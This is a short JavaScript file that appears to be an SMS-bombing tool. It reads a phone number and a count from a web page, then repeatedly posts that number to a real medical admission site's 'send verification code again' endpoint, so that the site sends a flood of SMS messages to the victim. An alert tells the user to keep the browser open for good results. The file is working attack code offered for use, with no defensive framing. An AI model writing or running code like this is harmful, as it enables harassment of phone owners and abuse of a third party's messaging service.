const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

function makeRequests() {
  const number = document.getElementById("phoneNumber").value;
  const amount = parseInt(document.getElementById("requestAmount").value);
  const logElement = document.getElementById("requestsLog");

  if (isNaN(amount) || amount <= 0) {
    logElement.innerHTML = "<p>Please enter a valid positive number for the amount.</p>";
    return;
  }

  logElement.innerHTML = ""; // Clear previous log

  const sendData = async () => {
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: headers,
        body: new URLSearchParams({ "phone": number }),
      });

      const responseData = await response.text();

      if (responseData.includes("Msg sent")) {
        logElement.innerHTML += `<p>Msg sent successfully!</p>`;
      } else {
        logElement.innerHTML += `<p>Failed to send the message.</p>`;
      }
    } catch (error) {
      console.error("Error sending request:", error);
      logElement.innerHTML += `<p>Error sending request.</p>`;
    }
  };

  const sendRequestsSequentially = async () => {
    for (let i = 0; i < amount; i++) {
      await sendData();
    }
  };

  alert(`${amount} SMS sending to ${number}. For good results, keep the browser open for a few minutes.`);

  sendRequestsSequentially();
}
